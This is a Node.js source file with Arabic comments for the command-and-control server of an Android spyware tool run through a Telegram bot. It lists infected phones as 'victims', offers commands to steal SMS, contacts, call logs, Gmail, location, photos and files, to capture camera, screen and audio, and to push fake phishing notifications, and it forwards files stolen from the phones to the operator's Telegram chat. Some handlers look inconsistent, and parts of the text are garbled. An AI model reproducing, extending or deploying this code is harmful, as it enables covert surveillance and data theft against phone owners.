const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// قراءة بيانات التوكن والأيدي من ملف الإعدادات المحلي
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data['token'], { 'polling': true });
const appData = new Map();

// مصفوفة الأوامر المتاحة في لوحة تحكم البوت
const actions = [
    '📞 سجل المكالمات 📞',
    '💬 سحب الرسائل 💬',
    '📒 سحبجهات الاتصال 📒',
    '📂 عرض جميع الملفات 📂',
    '📸 كيمرا أمامية 📸',
    '📸 كيمرا خلفية 📸',
    '📺 لقطة شاشة 😎',
    '🎙 تسجيل صوت 🎙',
    '📳 اهتزاز 📳',
    '▶ تشغيل الصوت ▶',
    '🛑 ايقاف الصوت 🛑',
    'toast',
    '📽 التطبيقات 📽',
    '📧 سحب رسايل جيميل 📧',
    '📍 الموقع الجغرافي 📍',
    '📧 سحب رسايلل 📧',
    '🔔 اشعار صفحة مزورة ‼',
    '📥 تحميل ملف من الهاتف 📥',
    '📁 عرض الملفات لدى الهاتف 📁',
    '🎬 سحب جميع الصور 🎬',
    'selfie-cam',
    'main-camera',
    '📺 لقطة للشاشة 😎',
    '😎 اضهار رسالة 😎'
];

// مسار الترحيب الافتراضي بالخادم
app.get('/', (req, res) => {
    res.send('<h1 align="center">Sterling qualanded successfully</h1>');
});

// مسار استقبال ورفع الملفات من الضحية إلى تيليجرام
app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const deviceModel = req.body.model;
    
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `<b>✯ تم رفع الملف من هاتف </b>\n\n• <b>Device Model : </b>${deviceModel}\n\n• Message from <b>Realm RMS3269</b> disvise\n\nDEVELOPED BY : @name_dark`,
        parse_mode: 'HTML'
    }, {
        filename: fileName,
        contentType: 'application/octet-stream'
    });
    res.send('Done');
});

// التعامل مع اتصالات الأجهزة عبر Socket.io
io.on('connection', socket => {
    let deviceModel = (socket.handshake.headers.model || 'unknown') + '-' + io.engine.clientsCount;
    let androidVersion = socket.handshake.headers.version || 'no information';
    let clientIp = socket.handshake.headers.ip || 'no information';

    socket.model = deviceModel;
    socket.version = androidVersion;
    socket.ip = clientIp;

    let connectMsg = `<b>✯ جهاز متصل جديد </b>\n\n• <b>اسم الهاتف : </b>${deviceModel}\n• <b>إصدار أندرويد : </b>${androidVersion}\n• <b>ip : </b>${clientIp}\n\n`;
    bot.sendMessage(data.id, connectMsg, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        let disconnectMsg = `<b>✯ جهاز غير متصل </b>\n\n• <b>اسم الهاتف : </b>${deviceModel}\n`;
        bot.sendMessage(data.id, disconnectMsg, { parse_mode: 'HTML' });
    });

    // استلام قائمة الملفات أو المجلدات
    socket.on('file-explorer', fileList => {
        let keyboardRows = [], currentRow = [];
        fileList.forEach((fileItem) => {
            let callbackData = fileItem.isFolder ? deviceModel + '|cd-' + fileItem.name : deviceModel + '|request-' + fileItem.name;
            
            if (currentRow.length === 2 || currentRow.length === 4) {
                currentRow.push({ text: fileItem.name, callback_data: callbackData });
                if (currentRow.length === 2) keyboardRows.push(currentRow);
            } else {
                currentRow.push({ text: fileItem.name, callback_data: callbackData });
                keyboardRows.push(currentRow);
                currentRow = [];
            }
        });
        keyboardRows.push([{ text: '✯ التراجع إلى القائمة الرئيسية ✯', callback_data: deviceModel + '|back-0' }]);
        bot.sendMessage(data.id, `<b>✯ حدد اي ملف تريد فتحه </b>\n\n• <b>اسم الهاتف : </b>${deviceModel}\n\n`, {
            reply_markup: { inline_keyboard: keyboardRows },
            parse_mode: 'HTML'
        });
    });

    socket.on('notification', notificationText => {
        bot.sendMessage(data.id, `‼ اشعار صفحة مزورة ‼\n\n• <b>اسم الهاتف : </b>${deviceModel}\n\n` + notificationText, { parse_mode: 'HTML' });
    });
});

// التعامل مع أوامر ورسائل بوت تيليجرام
bot.on('message', msg => {
    let chatId = msg.chat.id;
    let text = msg.text;

    if (text === '/start') {
        bot.sendMessage(data.id, `<b>✯ أهلآ وسهلا في اقوى بوت تحكم بضحايا </b>\n\n• صنع برمجيآ بمعية تحكم قوي...\n\n• Telegram → @u_x86 \n\n`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ عدد الاجهزة المتصلة ✯', '✯ قائمة التحكم ✯'],
                    ['✯ حول البوت ✯']
                ],
                resize_keyboard: true
            }
        });
    } else if (text === '✯ عدد الاجهزة المتصلة ✯') {
        let count = io.sockets.sockets.size;
        if (count === 0) {
            bot.sendMessage(data.id, '<b>✯ لايوجد ضحية متصل حاليا </b>', { parse_mode: 'HTML' });
        } else {
            let listMsg = `<b>✯ عدد الضحايا المتصلين : </b>${count}\n\n`;
            let counter = 1;
            io.sockets.sockets.forEach((socketObj) => {
                listMsg += `• <b>${counter++} - </b><b>اسم الهاتف : </b>${socketObj.model}\n• <b>إصدار أندرويد : </b>${socketObj.version}\n• <b>ip : </b>${socketObj.ip}\n\n`;
            });
            bot.sendMessage(data.id, listMsg, { parse_mode: 'HTML' });
        }
    } else if (text === '✯ قائمة التحكم ✯') {
        let count = io.sockets.sockets.size;
        if (count === 0) {
            bot.sendMessage(data.id, '<b>✯ لايوجد ضحية متصل </b>', { parse_mode: 'HTML' });
        } else {
            let deviceButtons = [];
            io.sockets.sockets.forEach((socketObj) => {
                deviceButtons.push([socketObj.model]);
            });
            deviceButtons.push(['✯ العودة إلى القائمة الرئيسية ✯']);
            bot.sendMessage(data.id, '<b>✯ حدد اجهزه تريد التحكم به</b>\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: deviceButtons,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    } else if (text === '✯ العودة إلى القائمة الرئيسية ✯') {
        bot.sendMessage(data.id, '<b>✯ القائمة الرئيسية </b>', { parse_mode: 'HTML' });
    } else if (text === '✯ حول البوت ✯') {
        bot.sendMessage(data.id, '<b>✯ بوت تحكم مخصص للأجهزة </b>\n\n• تم تطويره وتثبيته بنجاح تام.', { parse_mode: 'HTML' });
    }
});

// التعامل مع الضغط على أزرار التفاعل (Inline Keyboard / Callbacks)
bot.on('callback_query', callbackQuery => {
    let targetUuid = appData.get('currentTar');
    
    bot.getFileLink(callbackQuery.message.message_id).then(fileUrl => {
        if (targetUuid) {
            io.to(targetUuid).emit('request', {
                request: 'file',
                extras: [{ key: 'url', value: fileUrl }]
            });
        }
    }).catch(err => {
        console.log(err);
    });
});

// إرسال نبضات دورية (Ping) للأجهزة المتصلة للحفاظ على الاتصال
setInterval(() => {
    io.sockets.sockets.forEach((socketObj, socketId) => {
        io.to(socketId).emit('ping', {});
    });
}, 5000);

// تشغيل الخادم على المنفذ المحدد
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is listening on port ${PORT}`);
});
